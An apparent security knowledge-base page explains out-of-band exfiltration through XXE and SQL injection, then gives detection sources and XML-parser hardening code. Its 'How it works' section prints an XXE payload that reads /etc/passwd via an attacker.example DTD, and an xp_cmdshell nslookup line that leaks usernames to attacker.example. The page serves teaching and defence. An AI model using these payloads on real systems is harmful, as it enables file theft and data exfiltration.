---
title: Out-of-Band Data Exfiltration
type: concept
platforms: [Windows, Linux]
languages: [Bash, Python, HTTP]
tasks: [Threat Hunting, Investigation, Incident Response]
category: Web Application Attacks
security_domain: Application
author: RJGProjectz
date_created: 2026-11-24
last_updated: 2026-11-24
tags: [concept, out-of-band, oob, exfiltration, xxe, dns-exfiltration, sql-injection, blind-injection, covert-channel]
aliases: [OOB exfiltration, out-of-band XXE, blind SQL exfiltration, DNS data exfiltration, covert data channel]
difficulty: intermediate
verified: false
# last_verified:
---

# Out-of-Band Data Exfiltration
> **Created**: 2026-11-24T00:00:00Z
> **Last Modified**: 2026-11-24T00:00:00Z
> **Author**: RJGProjectz

!!! danger "VERIFY BEFORE PRODUCTION USE"
    Remove this block when `verified: true`.

**In one line:** out-of-band (OOB) exfiltration uses a secondary channel — typically DNS or HTTP to an attacker-controlled server — to smuggle data out when the vulnerable application's direct response does not return the extracted content.

## What it is

Conventional injection attacks are **in-band**: the attacker sends a payload, the application processes it, and the result comes back in the same HTTP response the attacker already has open. This model breaks down when the application does not return query results, suppresses error messages, or sits behind a WAF that blocks suspicious response content.

Out-of-band exfiltration solves this by separating the *trigger* channel from the *data* channel. The attacker injects a payload that causes the **server** to make an outbound connection — to a DNS server or HTTP endpoint the attacker controls — carrying the exfiltrated data as part of that request. The attacker watches their server logs; the application's response to the original request is irrelevant.

The two most common vehicles are **XXE (XML External Entity) injection** and **SQL injection OOB** using database-specific network functions. [Web Application Security, 2nd ed., pp. 189–208]

## How it works

### XXE out-of-band

An application that parses XML without disabling external entities can be forced to fetch an attacker-controlled URL during parsing. The attacker crafts a malicious DTD that reads a local file and embeds its content in a DNS lookup or HTTP request to their server:

```xml
<!-- Payload sent to vulnerable XML endpoint (for lab/educational use only) -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd  SYSTEM "http://attacker.example/oob.dtd">
  %dtd;
]>
<root>&exfil;</root>
```

The external DTD at `attacker.example/oob.dtd` then chains entity references to send the file content out via HTTP or DNS.

### SQL injection OOB — DNS channel

Databases that have outbound network capabilities (`xp_cmdshell` on SQL Server, `UTL_HTTP` / `UTL_FILE` on Oracle, `LOAD_FILE()` / `INTO OUTFILE` on MySQL) can be weaponised to encode query results in DNS hostnames:

```sql
-- SQL Server example (educational — do not use on systems you do not own)
-- Data is encoded in a subdomain of the attacker's DNS server
EXEC xp_cmdshell 'nslookup ' + (SELECT TOP 1 username FROM users) + '.attacker.example'
```

The attacker's authoritative DNS server logs every query. Each subdomain lookup carries a fragment of exfiltrated data.

### Inferential (blind) exfiltration

When neither in-band nor OOB channels are available, **inferential exfiltration** extracts data bit-by-bit through boolean or time-based responses — no outbound connection needed, but it is extremely slow (seconds per character). This is a last resort; OOB is preferred when outbound network access exists.

## Why it matters

| | |
| :--- | :--- |
| **MITRE ATT&CK** | [T1048](https://attack.mitre.org/techniques/T1048/) — Exfiltration Over Alternative Protocol; [T1071.004](https://attack.mitre.org/techniques/T1071/004/) — Application Layer Protocol: DNS |
| **What it leads to** | Silent exfiltration of credentials, PII, database contents — no alert in the application response |
| **Where defenders meet it** | Anomalous outbound DNS queries from web/database servers, unexpected HTTP calls from server-side processes |
| **Why it's hard to catch** | Outbound DNS from servers rarely triggers alerts; data is in subdomain labels, not query bodies |

## Do it

Defensive checks in your own environment:

```bash
# Check if XML parser has external entity processing enabled (conceptual — test in a lab)
# Look for DOCTYPE declarations in XML inputs your app accepts
grep -r "DOCTYPE\|ENTITY\|SYSTEM" /var/log/app/ 2>/dev/null | head -20

# Monitor outbound DNS from servers — unusual if a web/DB server resolves random subdomains
# (run on a network tap or DNS resolver you control)
tcpdump -n -i any port 53 2>/dev/null | grep -v "in-addr.arpa\|local\|internal"
```

> [!CAUTION]
> **SECURITY WARNING**: OOB payload construction and testing must only be performed against applications you own or have explicit written authorisation to test. Sending XXE or SQL injection payloads to any third-party system without authorisation is illegal. Use an isolated lab environment (DVWA, WebGoat, or a local Docker stack) for hands-on practice.

Hardening measures:

```python
# Python — disable XXE in lxml (the correct default)
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    load_dtd=False
)
tree = etree.fromstring(xml_data, parser=parser)
```

```python
# Python — disable XXE in xml.etree (stdlib — no DTD processing by default, but defusedxml is safer)
import defusedxml.ElementTree as ET
tree = ET.fromstring(xml_data)  # Safe: external entities and DTD loading disabled
```

## See it

| Source | What you look for |
| :--- | :--- |
| DNS resolver logs | Web or DB server resolving hostnames with long, random-looking subdomains |
| Firewall / proxy logs | Outbound HTTP/HTTPS from servers that should have no internet access |
| WAF logs | XXE patterns in XML request bodies; `SYSTEM`, `DOCTYPE`, `ENTITY` keywords |
| DB query logs | `xp_cmdshell`, `UTL_HTTP`, `LOAD_FILE` calls |
| Application logs | XML parse errors referencing external URIs (server failed to reach the OOB host) |

## Detect it

- Web application threats: [Threat Hunting](../../tasks/threat-hunting/index.md)
- Investigate data exfiltration: [Data Exfiltration](../../offensive/data-exfiltration.md)
- Detection engineering for DNS abuse: [Detection Engineering](../../tasks/detection-engineering/index.md)
- Harden XML parsers: [Hardening](../../tasks/hardening/index.md)

## Related concepts

- [Data Exfiltration](../../offensive/data-exfiltration.md)
- Supply Chain Attacks
- Covering Tracks

## Citations

- Hoffman, A. *Web Application Security*, 2nd ed. O'Reilly, 2024 — pp. 189–192 (XXE out-of-band), pp. 206–208 (SQL injection OOB and inferential exfiltration).
